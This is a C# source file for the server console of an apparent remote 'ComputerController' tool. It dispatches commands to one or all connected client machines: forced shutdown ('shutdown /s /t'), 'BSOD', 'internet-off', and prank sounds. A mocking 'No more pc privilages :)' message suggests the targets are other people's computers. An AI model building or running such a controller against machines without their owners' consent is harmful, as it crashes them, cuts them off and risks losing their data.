using System;
using System.Collections.Generic;
using System.Text;

namespace ComputerController
{
    class Commands
    {
        public static string Command;
        public static string[] commands = { "shutdown", "commandlist", "BSOD", "test", "beep", "internet-off", "mario", "tetris" };

        public static void ListenForConsoleInput()
        {
            while (true)
            {
                Command = Console.ReadLine();
                if (!String.IsNullOrWhiteSpace(Command))
                {
                    ReadConsoleInput();
                }
            }
        }

        public static void ReadConsoleInput()
        {
            if (Command.StartsWith("/"))
            {
                Command = Command.Replace("/", "");
                string[] args = Command.Split(' ');
                int id = 0;
                bool correctIDFormat = false;
                bool shuttingDown = false;
                string time = string.Empty;
                bool timeIsInt = false;

                int commandslength = commands.Length;
                foreach (string command in commands)
                {
                    if (!command.Contains(args[0]))
                    {
                        commandslength -= 1;
                    }
                }

                if (commandslength == 0)
                {
                    Console.WriteLine("The Command '" + Command + "' is an invalid command, for a list of commands you can use enter '/commandlist'. ");
                    return;
                }

                if (Command.Contains("commandlist"))
                {
                    Console.WriteLine("Here is a list of commands you can use:");

                    foreach (string command in commands)
                    {
                        Console.WriteLine("/" + command);
                    }
                }

                if (args.Length > 1)
                {
                    try
                    {
                        id = Int32.Parse(args[1]);
                        correctIDFormat = true;
                    }

                    catch
                    {
                        if (args[1] != "all")
                        {
                            Console.WriteLine("ERROR: Incorrect Client ID Format: Must be a number or 'all'!");
                        }

                        else
                        {
                            correctIDFormat = true;
                        }
                    }

                }

                else
                {
                    Console.WriteLine("You must include a client ID!");
                }

                if (correctIDFormat)
                {
                    if (args.Length == 2)
                    {
                        if (id != 0)
                        {
                            if (Server.ConnectedClientsIndex >= id)
                            {
                                // ==== IF YOUR COMMAND DOES NOT TAKE ANY ARGUMENTS AND ONLY REQUIRES A CLIENT ID PUT THE CODE HERE.. ==== \\

                                if (Command.Contains("shutdown"))
                                {
                                    ServerSend.CmdCommand(id, "shutdown /s /t 4");
                                    shuttingDown = true;
                                }

                                if (Command.Contains("BSOD"))
                                {
                                    ServerSend.CmdCommand(id, "BSOD");
                                    Console.WriteLine("No more pc privilages :)");
                                }

                                if (Command.Contains("test"))
                                {
                                    ServerSend.CmdCommand(id, "test");
                                    Console.WriteLine("working on server side");
                                }

                                if (Command.Contains("beep"))
                                {
                                    ServerSend.CmdCommand(id, "beep");
                                }

                                if (Command.Contains("mario"))
                                {
                                    ServerSend.CmdCommand(id, "mario");
                                }

                                if (Command.Contains("tetris"))
                                {
                                    ServerSend.CmdCommand(id, "tetris");
                                }

                                if (Command.Contains("internet-off"))
                                {
                                    ServerSend.CmdCommand(id, "internet-off");
                                }
                            }
                        }

                        else if (args[1] == "all")
                        {
                            // ==== ADD THE CODE FOR YOUR COMMAND HERE TOO SO IT CAN BE EXECUTED ON ALL CLIENTS AT ONCE.. ==== \\

                            if (Command.Contains("shutdown"))
                            {
                                ServerSend.CmdCommandToAll("shutdown /s /t 4");
                                shuttingDown = true;
                            }

                            if (Command.Contains("BSOD"))
                            {
                                ServerSend.CmdCommandToAll("BSOD");
                                Console.WriteLine("No more pc privilages :)");
                            }
                        }

                        else
                        {
                            if (id == 0)
                            {
                                Console.WriteLine($"ERROR: A Client with the ID '0' does not exist!");
                            }

                            else
                            {
                                Console.WriteLine("ERROR: Incorrect Argument: The ID arg was not a number or 'all'!");
                            }
                        }
                    }

                    // ==== ONLY ADD A COMMAND IN THIS IF IT TAKES A 3RD ARGUMENT.. ==== \\
                    else if (args.Length == 3)
                    {
                        try
                        {
                            // ==== PUT THE CODE FOR HANDLING YOUR 3RD ARGUMENT HERE.. ==== \\

                            if (Command.Contains("shutdown"))
                            {
                                Int32.Parse(args[2]);
                                time = args[2];
                                timeIsInt = true;
                            }


                        }

                        catch
                        {
                            Console.WriteLine($"ERROR: Incorrect time value specified: {args[2]}");
                        }

                        if (timeIsInt)
                        {
                            if (args[1] == "all")
                            {
                                // ==== PUT THE CODE FOR YOUR COMMAND HERE FOR EXECUTING ON ALL CLIENTS.. ==== \\

                                if (Command.Contains("shutdown"))
                                {
                                    ServerSend.CmdCommandToAll($"shutdown /s /t {time}");
                                    shuttingDown = true;
                                }


                            }

                            else
                            {
                                // ==== PUT THE CODE FOR YOUR COMMAND HERE FOR EXECUTING ON A SPECIFIC CLIENT.. ==== \\

                                if (Command.Contains("shutdown"))
                                {
                                    ServerSend.CmdCommand(id, $"shutdown /s /t {time}");
                                    shuttingDown = true;
                                }


                            }
                        }
                    }

                    if (shuttingDown)
                    {
                        //Console.WriteLine($"{Server.clients[id].info.DesktopName} going dark...");
                    }
                }

                Command = string.Empty;
            }

            else
            {
                Console.SetCursorPosition(0, Console.CursorTop - 1);
                Console.WriteLine("                                                                              ");
                Console.SetCursorPosition(0, Console.CursorTop - 1);
            }
        }
    }
}